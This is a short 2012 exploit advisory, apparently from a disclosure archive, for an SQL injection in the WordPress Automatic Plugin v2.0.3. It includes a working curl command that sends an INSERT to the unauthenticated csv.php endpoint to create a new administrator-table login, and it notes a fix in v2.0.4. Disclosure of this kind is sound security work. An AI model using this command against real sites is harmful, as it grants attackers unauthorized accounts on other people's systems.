@@ -1,0 +1,27 @@
+Title:
+======
+Wordpress Automatic Plugin v2.0.3 SQL Injection
+
+Date:
+=====
+2012-06-15
+
+Website:
+===========
+http://codecanyon.net/item/wordpress-automatic-plugin/1904470
+
+Introduction:
+=============
+Wordpress automatic plugin posts quality targeted articles, Amazon Products, clickbank Products, Youtube Videos and feeds posts on auto-pilot. just install and leave, it will work 24/7* to blog for you . 
+
+Exploit Details:
+================
+The vulnerability occurs in the csv.php file which does not require valid login credentials and can be used to execute SQL Queries
+
+Using this cURL command a user can send this POST data which will create a new login:
+$ curl --data q=INSERT INTO `wp_users` (`user_login`, `user_pass`, `user_email`) VALUES ('test', '123456', 'jblow@gmail.com') http://www.example.com/blog/wp-content/plugins/wp-automatic/inc/csv.php
+
+Fix:
+====
+The author of this plugin has released a fix for this vulnerability and users are urged to upgrade to v2.0.4.
+
